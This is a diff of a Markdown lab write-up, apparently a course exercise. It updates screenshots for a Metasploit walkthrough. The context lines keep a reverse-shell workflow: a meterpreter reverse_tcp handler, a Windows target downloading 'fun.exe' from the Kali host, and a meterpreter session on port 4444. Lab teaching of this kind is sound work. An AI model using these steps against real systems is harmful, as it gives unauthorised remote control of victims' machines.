@@ -66,7 +66,7 @@ Check the status of apache2
 
 Invoke msfconsole:
 ## OUTPUT:
-![Uploading Screenshot 2025-04-07 114636.png…]()
+
 
 
 
@@ -80,7 +80,7 @@ use multi/handler
 set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST 0.0.0.0
 exploit
-![Screenshot 2025-04-07 115214](https://github.com/user-attachments/assets/ea384ca5-6c96-405e-9b45-b23f4e9fab41)
+![Screenshot 2025-04-07 114636](https://github.com/user-attachments/assets/b03d96a2-1d8d-4dec-8a0f-22c7cec2b903)
 
 
 
@@ -88,7 +88,8 @@ exploit
 On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
 http://192.168.1.2/fun.exe
 The file "fun.exe" downloads. 
-![Screenshot 2025-04-07 115416](https://github.com/user-attachments/assets/c77d859f-ec36-4ce5-a9d5-e54633f390c7)
+![Screenshot 2025-04-11 141549](https://github.com/user-attachments/assets/1280db57-07f0-4f80-8c79-d2915f41f8f3)
+
 
 
 
@@ -108,7 +109,8 @@ at meterpreter > prompt, execute this command:
 netstat
 A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
 Notice the "PID/Program name" value for this connection, which is redacted 
-![Screenshot 2025-04-07 115242](https://github.com/user-attachments/assets/13ef9689-8a76-4d7c-bb44-0e4ee9807099)
+![Screenshot 2025-04-11 141747](https://github.com/user-attachments/assets/0fe234e9-00ba-4e13-a399-c178ccb54fd9)
+
 
 
 
